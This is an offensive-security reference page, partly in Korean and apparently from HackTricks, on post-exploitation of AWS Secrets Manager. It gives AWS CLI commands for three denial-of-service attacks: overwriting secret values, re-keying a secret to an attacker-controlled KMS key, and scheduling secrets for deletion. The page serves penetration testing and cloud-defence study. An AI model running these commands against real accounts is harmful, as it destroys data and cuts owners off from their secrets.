# AWS - Secrets Manager Post Exploitation

{{#include ../../../banners/hacktricks-training.md}}

## Secrets Manager

For more information check:

{{#ref}}
../aws-services/aws-secrets-manager-enum.md
{{#endref}}

### Read Secrets

The **secrets 자체는 민감한 정보**이며, 읽는 방법은 [check the privesc page](../aws-privilege-escalation/aws-secrets-manager-privesc.md)를 확인하세요.

### DoS Change Secret Value

secret의 값을 변경하면 **해당 값에 의존하는 모든 시스템을 DoS할 수 있습니다.**

> [!WARNING]
> 이전 값들도 저장되어 있으므로, 이전 값으로 되돌리는 것은 쉽습니다.
```bash
# Requires permission secretsmanager:PutSecretValue
aws secretsmanager put-secret-value \
--secret-id MyTestSecret \
--secret-string "{\"user\":\"diegor\",\"password\":\"EXAMPLE-PASSWORD\"}"
```
### DoS Change KMS key

공격자가 secretsmanager:UpdateSecret 권한을 가지고 있으면, secret을 공격자가 소유한 KMS key를 사용하도록 구성할 수 있습니다. 그 키는 처음에는 누구나 접근하고 사용할 수 있도록 설정되어 있으므로, secret을 새 키로 업데이트하는 것이 가능합니다. 만약 그 키에 접근할 수 없었다면, secret을 업데이트할 수 없었을 것입니다.

secret의 키를 변경한 후, 공격자는 자신의 키 구성을 수정하여 오직 자신만 접근할 수 있도록 만듭니다. 이렇게 하면 이후 버전의 secret은 새 키로 암호화되고, 해당 키에 접근할 수 없기 때문에 secret을 검색할 수 있는 능력은 상실됩니다.

중요한 점은 이 접근 불가능 상태는 secret의 내용이 변경된 이후의 이후 버전에서만 발생한다는 것입니다. 현재 버전은 여전히 원래 KMS key로 암호화되어 있기 때문입니다.
```bash
aws secretsmanager update-secret \
--secret-id MyTestSecret \
--kms-key-id arn:aws:kms:us-west-2:123456789012:key/EXAMPLE1-90ab-cdef-fedc-ba987EXAMPLE
```
### DoS Secret 삭제

secret을 삭제하기 위한 최소 대기 일수는 7일입니다.
```bash
aws secretsmanager delete-secret \
--secret-id MyTestSecret \
--recovery-window-in-days 7
```
{{#include ../../../banners/hacktricks-training.md}}
